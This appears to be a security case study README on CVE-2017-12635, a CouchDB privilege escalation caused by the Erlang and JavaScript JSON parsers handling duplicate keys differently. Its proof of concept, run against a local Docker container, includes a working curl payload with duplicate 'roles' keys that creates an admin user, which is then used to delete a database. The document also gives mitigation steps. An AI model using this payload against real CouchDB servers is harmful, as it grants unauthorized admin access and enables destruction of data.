# CVE-2017-12635

Case study and PoC of CVE-2017-12635 (Apache CouchDB 1.7.0 / 2.x < 2.1.1) - **Remote Privilege Escalation**

## Presentation

### CouchDB

Apache CouchDB is a document-oriented NoSQL database, implemented in Erlang.

CouchDB uses multiple formats and protocols to store, transfer, and process it's data, it uses JSON to store data, JavaScript as its query language using MapReduce, and HTTP for an API.

CouchDB can be used as a Single Node Database as well as a Cluster.

### Vulnerability

Due to the discrepancy between the Erlang-based JSON parser and JavaScript-based JSON parser, there was a vulnerability in CouchDB before 1.7.0 and 2.x before 2.1.1 allowing non-admin users to escalate privilege by submitting `_users` documents with duplicate `roles` keys used for access control within the databases, including the special case `_admin` role, that denotes administrative users.

To recap, the vulnerability allows non-admin users to give themselves admin privileges.

## More about CouchDB

### Authentication

Out of the box, CouchDB allows any request to be made by anyone. Everybody has privileges to do anything.

CouchDB has the idea of an admin user (e.g. an administrator, a super user, or root) that is allowed to do anything to a CouchDB installation. By default, everybody is an admin. If you don’t like that, you can create specific admin users with a username and password as their credentials.

CouchDB also defines a set of requests that only admin users are allowed to do. Visit [official docs](https://docs.couchdb.org/en/1.6.1/intro/security.html#authentication) for more information.

CouchDB has special authentication database that stores all registered users as JSON documents.

CouchDB uses special database (called `_users` by default) to store information about registered users. This is a system database – this means that while it shares common database API, there are some special security-related constraints applied and used agreements on documents structure.

Only administrators may `GET`, `PUT` or `DELETE` any document in `_users` database.

Users may only access (`GET /_users/org.couchdb.user:<username>`) or modify (`PUT /_users/org.couchdb.user:<username>`) documents that they owns.

Each CouchDB user is stored in document format. These documents are contains several mandatory fields, that CouchDB handles for correct authentication process. We are interested in `roles` field.

`roles` field is a list of user roles. CouchDB doesn’t provides any builtin roles, so you’re free to define your own depending on your needs. However, you cannot set system roles like `_admin` there. Also, only administrators may assign roles to users - by default all users have no roles.

### Validation Functions

CouchDB is written in Erlang, but allows users to specify document validation scripts in Javascript. These scripts are automatically evaluated when a document is created or updated. They start in a new process, and are passed JSON-serialized documents from the Erlang side.

CouchDB sends functions and documents to a JavaScript interpreter. This mechanism is what allows users to write document validation functions in JavaScript. The `validate_doc_update` function gets executed for each created or updated document. If the validation function raises an exception, the update is denied; when it doesn’t, the updates are accepted.

CouchDB uses the `validate_doc_update` function to prevent invalid or unauthorized document updates from proceeding.

```javascript
function(newDoc, oldDoc, userCtx, secObj) {...}
```

Arguments:

- `newDoc` – New version of document that will be stored
- `oldDoc` – Previous version of document that is already stored
- `userCtx` – User Context Object
- `srcObj` – Security Object

The function is passed the new document from the update request, the current document stored in the database, a `User Context Object` containing information about the user writing the document (if present), and a `Security Object` with lists of database security roles.

### JSON Parsers

The JSON parser used internally by CouchDB is [jiffy](https://github.com/davisp/jiffy) and the one used in validation scripts by JavaScript is [JSON](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON).

The problem is that there is a discrepancy between `JSON` and `jiffy` when dealing with duplicate keys.

For a given key, the Erlang parser will store both values, but the Javascript parser will only store the last one.

For example, parsing `{"name":"John", "name":"Jane"}` using both parsers will produce:

- Using `jiffy`: `{[{<<"name">>,<<"John">>},{<<"name">>,<<"Jane">>}]}`
- Using `JSON`: `{name: "Jane"}`

The getter function for CouchDB’s internal representation of the data will only return the first value.

## PoC

### Description

We can bypass all of the relevant input validation and create an admin user by creating a user with duplicate `roles` key.
This is what the new user's document looks like: `{..., "roles": ["_admin"], "roles": [], ...}` .

The getter function for CouchDB’s internal representation of the data will only return the first value. As a result, in Erlang land, we’ll see ourselves as having the `_admin` role, while in Javascript land we appear to have no special permissions.

Fortunately for the attacker, almost all of the important logic concerning authentication and authorization, aside from the input validation script, occurs the Erlang part of CouchDB.

### Demo

For this demo, we will use a `Docker` image from the official repository couchdb. We need an HTTP client to perform API calls and we will use `cURL` for that.

Any operating system can be used for this demo.

Prerequisites:

- [Docker](https://www.docker.com/)
- [cURL](https://curl.haxx.se/)

These are the commands to run in order to exploit the vulnerability:

1. Create a container based on couchdb official image

   ```bash
   docker container run -d --name couchdb-sandbox -p 5984:5984 couchdb:1.6.1
   ```

   We chosed 1.6.1 tag because the version 1.6.1 of CouchDB is vulnerable.

2. Make sure the CouchDB instance is launched and working

   ```bash
   curl -X GET http://localhost:5984
   ```

3. Query: All databases in the instance

   ```bash
   curl -X GET http://localhost:5984/_all_dbs
   ```

4. Query: Create a new database named `records`

   ```bash
   curl -X PUT http://localhost:5984/records
   ```

5. Query: Make sure the dabatase `records` is created

   ```bash
   curl -X GET http://localhost:5984/_all_dbs
   ```

   We can get, add and even remove all records from CouchDB instance because a default CouchDB install provides admin-level access to all connecting users. This configuration is known as Admin Party. We can crash the party simply by creating the first admin account.

6. Query: Create an admin account with credentials `admin:admin`

   ```bash
   curl -X PUT http://localhost:5984/_config/admins/admin -d '"admin"'
   ```

7. Query: Create a new database named `new_records`

   ```bash
   curl -X PUT http://localhost:5984/new_records
   ```

   Oops! We can no longer create a new database because the Admin Party is crashed when the first admin account was created.

8. Query: Create a new database named `new_recors` with admin authentication

   ```bash
   curl -X PUT http://admin:admin@localhost:5984/new_records
   ```

9. Query: Create a new document in `_users` database

   ```bash
   curl -X PUT http://localhost:5984/_users/org.couchdb.user:guest \
       -H "Accept: application/json" \
       -H "Content-Type: application/json" \
       -d '{"name": "guest", "password": "guest", "roles": ["_admin"], "roles": [], "type": "user"}'
   ```

   Here we can create a new document in `_users` database, but with restrictions on its arguments.
   We can bypass the restrictions by duplicating the `roles` field as explained before.

10. Query: Delete the database named `new_records`

    ```bash
    curl -X DELETE http://localhost:5984/new_records
    ```

    Oops! We can't because we don't have admin role.

11. Query: Delete the database named `new_records` with guest authentication

    ```bash
    curl -X DELETE http://guest:guest@localhost:5984/new_records
    ```

    Bingo! We deleted the database even if the guest account is created as a normal user.

The demo proved that any user can create an account with admin role and act on the database as if he's an admin.

## How to prevent

We can distinguish two kinds of CouchDB instances:

- Public CouchDB instance: The database server has a public access, and any user can connect to the database instance using the IP address of the server and the configured port for the database.
- Internal CouchDB instance: The database server has a private access, and only a group of users (local network for instance) can access the database.

By default, a CouchDB instance can be requested by anonymous users. To ensure that all allowed requests are only from authenticated users, we can set the `require_valid_user` to `true` in the database config file. By doing this, no requests are allowed from anonymous users, everyone must be authenticated.

These are some proceedings to make in order to prevent malicious users from exploiting the vulnerability. This is valid for all CouchDB 1.x and 2.x users that aren’t on 2.1.1 or later, or 1.7.1 or later.

Public CouchDB instances:

- You should already have updated to the new release.
- If you have enabled `require_valid_user` and if you trust all your users with database admin & server shell access: there is no problem.

Internal CouchDB instances:

- If you trust everyone on the network: there is no problem.
- If you have `require_valid_user` enabled and if you trust all your users with database admin & server shell access: there is no problem.
- If you have `require_valid_user` disabled and if you trust all your users with database admin & server shell access: enable `require_valid_user`.

## Glossary

**API**: An application programming interface (API) is an interface or communication protocol between different parts of a computer program intended to simplify the implementation and maintenance of software.

**Erlang**: Erlang is a general-purpose, concurrent, functional programming language, and a garbage-collected runtime system.

**HTTP**: The Hypertext Transfer Protocol (HTTP) is an application protocol for distributed, collaborative, hypermedia information systems. HTTP is the foundation of data communication for the World Wide Web, where hypertext documents include hyperlinks to other resources that the user can easily access.

**JSON**: JavaScript Object Notation (JSON) is an open-standard file format or data interchange format that uses human-readable text to transmit data objects consisting of attribute–value pairs and array data types (or any other serializable value). It is a very common data format, with a diverse range of applications, such as serving as replacement for XML in AJAX systems.

**MapReduce**: MapReduce is a programming model and an associated implementation for processing and generating big data sets with a parallel, distributed algorithm on a cluster.

**NoSQL**: A NoSQL database provides a mechanism for storage and retrieval of data that is modeled in means other than the tabular relations used in relational databases.

**PoC**: Proof of concept (PoC) is a realization of a certain method or idea in order to demonstrate its feasibility, or a demonstration in principle with the aim of verifying that some concept or theory has practical potential.

**Privilege Escalation**: Privilege escalation is the act of exploiting a bug, design flaw or configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user.

## References

- [https://www.cvedetails.com/cve/CVE-2017-12635/](https://www.cvedetails.com/cve/CVE-2017-12635/)
- [https://www.exploit-db.com/exploits/44498](https://www.exploit-db.com/exploits/44498)
- [https://justi.cz/security/2017/11/14/couchdb-rce-npm.html](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html)
- [https://docs.couchdb.org/en/1.6.1/](https://docs.couchdb.org/en/1.6.1/)
